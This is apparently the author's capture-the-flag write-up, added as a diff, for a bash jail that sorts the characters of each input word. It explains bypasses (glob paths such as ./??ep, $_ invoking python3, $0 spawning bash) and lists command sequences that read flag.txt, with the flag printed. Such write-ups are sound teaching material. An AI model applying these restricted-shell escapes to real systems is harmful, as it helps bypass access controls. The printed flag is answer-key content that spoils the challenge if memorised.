@@ -1,0 +1,58 @@
+As you probably figured out via experimentation, the challenge takes your input, breaks it 
+into words, sorts the characters alphabetically in each word, and finally executes the 
+resulting words separated by space into bash. E.g., 'ls' and 'cd' were unaffacted. You can 
+also chain commands with && or semicolor (;). There was no memory of previous commands, /tmp 
+was unwriteable, and circular brackets () were blocked for sanity :P
+
+There are many possible solutions. Generally you could:
+
+i) execute a command in PATH, or a shell builtin, that has a name in sorted order
+   -> in this case you can operate in the chal directory so you can specify target files directly
+      via * or ./????<something>
+ 
+   NOTE: the source (.) builtin was thwarted via commenting out the flag in the file
+
+   When we moved this chal to kctf, most binaries unexpectedly became accessible from /bin (the 
+   kctf directory structure is different from regular ubuntu), so the chal got even easier.. :P
+
+ii) cd to a directory and execute stuff there as long as you can match it via ./???<something>
+   -> in this case you can only specify directories in / as the target, such as /home (/???e)
+
+   NOTE: bash via ./?h in /bin was blocked with a recursive symlink /bin/rh -> /bin/rh
+
+iii) access some env vars, such as $_  -> this gives /usr/bin/python3 (!)
+
+   -> sadly, I forgot about $0 :D but it was an easy chal, so it is ok if you used that :)
+
+
+Some explicit solutions:
+
+# grep
+$ cd /bin ; ./??ep bct -r /???e
+/home/abhs/flag.txt:bctf{gr34t_I_gu3ss_you_g0t_that_5orted_out:P}
+
+# python
+$ $_ -i
+Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
+[GCC 10.2.1 20210110] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os; os.system("cat flag.txt")
+bctf{gr34t_I_gu3ss_you_g0t_that_5orted_out:P}
+
+# fmt
+$ fmt *
+...
+#bctf{gr34t_I_gu3ss_you_g0t_that_5orted_out:P} # #comments so that you
+cannot just exec this
+...
+
+# bash
+$0
+cat flag.txt
+#bctf{gr34t_I_gu3ss_you_g0t_that_5orted_out:P}
+#
+#comments so that you cannot just exec this
+
+
+Etc.
+===============
